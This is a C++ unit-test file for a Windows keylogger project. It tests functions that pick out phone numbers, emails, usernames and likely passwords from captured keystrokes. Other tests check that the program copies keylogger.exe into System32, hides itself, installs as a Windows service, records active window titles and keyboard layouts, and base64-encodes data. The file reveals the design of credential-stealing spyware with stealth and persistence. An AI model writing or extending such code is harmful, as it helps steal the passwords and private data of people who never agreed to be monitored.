#define DOCTEST_CONFIG_IMPLEMENT_WITH_MAIN
#include <doctest/doctest.h>
#include "keylogger.h" 
#include <string>       
#include <fstream>      
#include <windows.h>    

TEST_CASE("Testing isPhoneNumber") {
    CHECK(isPhoneNumber("+79123456789") == true);
    CHECK(isPhoneNumber("89123456789") == true);
    CHECK(isPhoneNumber("123456789") == true);
    CHECK(isPhoneNumber("+1") == true);
    CHECK(isPhoneNumber("+") == false);
    CHECK(isPhoneNumber("abc") == false);
    CHECK(isPhoneNumber("+79123a56789") == false);
    CHECK(isPhoneNumber("") == false);
}

TEST_CASE("Testing isEmail") {
    CHECK(isEmail("test@example.com") == true);
    CHECK(isEmail("user.name@domain.co") == true);
    CHECK(isEmail("a@b.c") == true);
    CHECK(isEmail("@example.com") == false);
    CHECK(isEmail("test@") == false);
    CHECK(isEmail("test@example.") == false);
    CHECK(isEmail("test@.com") == false);
    CHECK(isEmail("") == false);
}

TEST_CASE("Testing isUsername") {
    CHECK(isUsername("user123") == true);
    CHECK(isUsername("user-name") == true);
    CHECK(isUsername("user.name") == true);
    CHECK(isUsername("usr") == true);
    CHECK(isUsername("us") == false);
    CHECK(isUsername("user@name") == false);
    CHECK(isUsername("user name") == false);
    CHECK(isUsername("") == false);
}

TEST_CASE("Testing isProbablePassword") {
    CHECK(isProbablePassword("Password123") == true);
    CHECK(isProbablePassword("Secure!Pass") == false);
    CHECK(isProbablePassword("12345678a") == true);
    CHECK(isProbablePassword("short") == false);
    CHECK(isProbablePassword("12345678") == false);
    CHECK(isProbablePassword("abcdefgh") == false);
    CHECK(isProbablePassword("!@#$%^&*") == false);
    CHECK(isProbablePassword("") == false);
}

TEST_CASE("Testing registry functions") {
    SUBCASE("unpackToSystem32 creates file") {
        unpackToSystem32();
        char system32Path[MAX_PATH];
        GetSystemDirectoryA(system32Path, MAX_PATH);
        std::string destination = std::string(system32Path) + "\\keylogger.exe";
        std::ifstream file(destination);
        CHECK(file.good());
        file.close();
    }
}

TEST_CASE("Testing window functions") {
    SUBCASE("getActiveWindowTitle returns non-empty string") {
        std::string title = getActiveWindowTitle();
        CHECK_FALSE(title.empty());
    }
    
    SUBCASE("getCurrentLayout returns valid value") {
        std::string layout = getCurrentLayout();
        CHECK((layout == "EN" || layout == "RU" || layout == "Unknown"));
    }
}

TEST_CASE("Testing base64Encode") {
    CHECK(base64Encode("Hello") == "SGVsbG8=");
    CHECK(base64Encode("Test") == "VGVzdA==");
    CHECK(base64Encode("123") == "MTIz");
    CHECK(base64Encode("A long string to test encoding") == "QSBsb25nIHN0cmluZyB0byB0ZXN0IGVuY29kaW5n");
}

// Mihska's tests

TEST_CASE("Testing Service Control") {
    SUBCASE("ServiceCtrlHandler changes state on STOP") {
        g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        ServiceCtrlHandler(SERVICE_CONTROL_STOP);
        CHECK(g_ServiceStatus.dwCurrentState == SERVICE_STOP_PENDING);
    }
}

TEST_CASE("Testing hideExecutable") {
    SUBCASE("Returns true when already in system dir") {
        // Подготовка тестового окружения
        CHECK(hideExecutable() == true);
    }
}

TEST_CASE("Testing installService") {
    SUBCASE("Fails when cannot open SC Manager") {
        // Мокируем OpenSCManager чтобы возвращать NULL
        CHECK(installService() == false); // Должна быть обработка ошибки
    }
}